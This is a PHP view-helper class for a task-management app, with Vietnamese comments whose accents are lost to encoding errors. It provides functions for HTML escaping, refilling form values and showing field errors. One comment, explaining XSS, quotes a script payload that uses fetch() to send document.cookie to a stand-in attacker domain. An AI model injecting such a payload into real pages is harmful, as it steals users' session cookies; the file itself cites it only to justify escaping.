<?php
namespace App\Core;

/**
 * View Helper
 *
 * T?p h?p c�c h�m nh? hay d�ng trong file giao di?n, d? view kh?i ph?i
 * vi?t di vi?t l?i htmlspecialchars(...) d�i d�ng ? m?i ch?.
 *
 * V� sao ph?i escape?
 * N?u in th?ng d? li?u ngu?i d�ng ra HTML, ai d� d?t t�n task l�
 *     <script>fetch('http://k?-x?u.com?c='+document.cookie)</script>
 * th� do?n script d� s? CH?Y tr�n tr�nh duy?t c?a m?i ngu?i xem trang.
 * �� g?i l� XSS (Cross-Site Scripting). htmlspecialchars() bi?n c�c k� t?
 * < > " ' & th�nh k� t? v� h?i, n�n tr�nh duy?t hi?n ra d?ng ch? thay v� th?c thi.
 */
class View
{
    /**
     * Escape m?t chu?i tru?c khi in ra HTML
     *
     * C�ch d�ng:  <?= View::e($task['title']) ?>
     *
     * @param mixed $value
     * @return string
     */
    public static function e($value)
    {
        return htmlspecialchars((string)$value, ENT_QUOTES, 'UTF-8');
    }

    /**
     * L?y l?i gi� tr? ngu?i d�ng v?a nh?p (khi form b? l?i v� quay v?)
     *
     * C�ch d�ng:  value="<?= View::old($old, 'title') ?>"
     *
     * @param array  $old     M?ng d? li?u cu (Controller t? truy?n v�o m?i view)
     * @param string $key     T�n field
     * @param mixed  $default Gi� tr? d�ng khi kh�ng c� d? li?u cu
     * @return string �� escape s?n, in th?ng ra du?c
     */
    public static function old($old, $key, $default = '')
    {
        $value = (is_array($old) && array_key_exists($key, $old)) ? $old[$key] : $default;

        return self::e($value);
    }

    /**
     * Ki?m tra m?t field c� l?i kh�ng (d�ng d? t� vi?n d? � nh?p)
     *
     * @param array  $errors
     * @param string $key
     * @return bool
     */
    public static function hasError($errors, $key)
    {
        return is_array($errors) && isset($errors[$key]);
    }

    /**
     * Tr? v? class CSS "is-invalid" n?u field dang l?i
     *
     * C�ch d�ng:  class="form-control <?= View::invalid($errors, 'title') ?>"
     *
     * @param array  $errors
     * @param string $key
     * @return string
     */
    public static function invalid($errors, $key)
    {
        return self::hasError($errors, $key) ? 'is-invalid' : '';
    }

    /**
     * In d�ng th�ng b�o l?i nh? m�u d? ngay du?i � nh?p
     *
     * C�ch d�ng:  <?= View::error($errors, 'title') ?>
     *
     * @param array  $errors
     * @param string $key
     * @return string HTML (chu?i r?ng n?u field kh�ng l?i)
     */
    public static function error($errors, $key)
    {
        if (!self::hasError($errors, $key)) {
            return '';
        }

        return '<span class="field-error"><i class="fa-solid fa-circle-exclamation"></i> '
            . self::e($errors[$key]) . '</span>';
    }

    /**
     * L?y URL hi?n t?i (du?ng d?n + query string)
     *
     * D�ng cho field ?n "redirect" trong c�c form h�nh d?ng, d? sau khi
     * tick ho�n th�nh / d�nh sao, ngu?i d�ng quay l?i d�ng trang dang xem
     * (gi? nguy�n b? l?c, ki?u s?p x?p v� s? trang).
     *
     * @return string �� escape s?n
     */
    public static function currentUrl()
    {
        $uri = $_SERVER['REQUEST_URI'] ?? '/';

        return self::e($uri);
    }
}
